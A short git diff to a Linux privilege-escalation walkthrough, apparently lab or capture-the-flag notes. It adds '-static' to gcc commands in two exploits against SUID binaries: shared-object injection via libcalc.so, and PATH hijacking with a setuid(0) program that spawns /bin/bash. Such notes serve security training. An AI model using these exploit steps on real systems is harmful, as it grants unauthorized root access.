@@ -31,7 +31,7 @@ void inject() {
 8. Save the file as `libcalc.c` (make sure to use tabs not spaces, sometimes errors out)
 9. In command prompt type:
 ```
-gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c -static
 ```
 10. In command prompt type: `/usr/local/bin/suid-so`
 11. In command prompt type: `id`
@@ -103,7 +103,7 @@ Read [this](https://gtfobins.github.io/gtfobins/env/) for simpler exploit...
 ```
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
 ```
-2. In command prompt type: `gcc /tmp/service.c -o /tmp/service`
+2. In command prompt type: `gcc /tmp/service.c -o /tmp/service -static`
 3. In command prompt type: `export PATH=/tmp:$PATH`
 4. In command prompt type: `/usr/local/bin/suid-env`
 5. In command prompt type: `id`
